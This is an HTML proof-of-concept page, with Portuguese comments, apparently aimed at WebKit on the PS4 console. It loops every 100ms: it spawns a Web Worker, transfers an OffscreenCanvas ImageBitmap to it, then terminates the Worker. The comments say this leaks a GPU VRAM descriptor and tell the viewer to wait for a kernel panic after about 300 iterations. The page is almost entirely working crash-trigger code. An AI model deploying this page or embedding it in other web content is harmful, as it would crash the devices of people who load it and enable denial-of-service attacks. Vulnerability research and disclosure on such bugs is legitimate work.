<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PoC - OffscreenCanvas IPC Teardown Leak</title>
</head>
<body>
    <h2>OffscreenCanvas IPC Teardown</h2>
    <div id="log" style="font-family: monospace; font-size: 16px; background: #000; color: #0f0; padding: 10px;">Iniciando...</div>

    <script>
        const logEl = document.getElementById('log');
        // Worker vazio. A falha não é no código do worker, mas na destruição do seu contexto IPC.
        const workerCode = `onmessage = () => {};`;
        const url = URL.createObjectURL(new Blob([workerCode], {type: "text/javascript"}));
        
        let count = 0;
        
        // Loop conservador de 100ms: Garante que NUNCA há mais de 1 Worker ativo no sistema,
        // descartando completamente qualquer alegação de Thread Exhaustion.
        setInterval(() => {
            const w = new Worker(url);
            const canvas = new OffscreenCanvas(128, 128);
            const transferred = canvas.transferToImageBitmap ? canvas.transferToImageBitmap() : canvas;
            
            // 1. O WebKit mapeia a memória física e envia o ponteiro para a fila nativa do Worker
            try { w.postMessage({canvas: transferred}, [transferred]); } catch(e) {}
            
            // 2. A aniquilação imediata impede o Garbage Collector normal e 
            // falha em libertar o descritor de VRAM no driver da GPU do PS4.
            w.terminate(); 
            
            count++;
            logEl.innerText = `Iterações de vazamento de IPC/VRAM: ${count}\nAguarde o Kernel Panic (~300)...`;
            
        }, 100);
    </script>
</body>
</html>
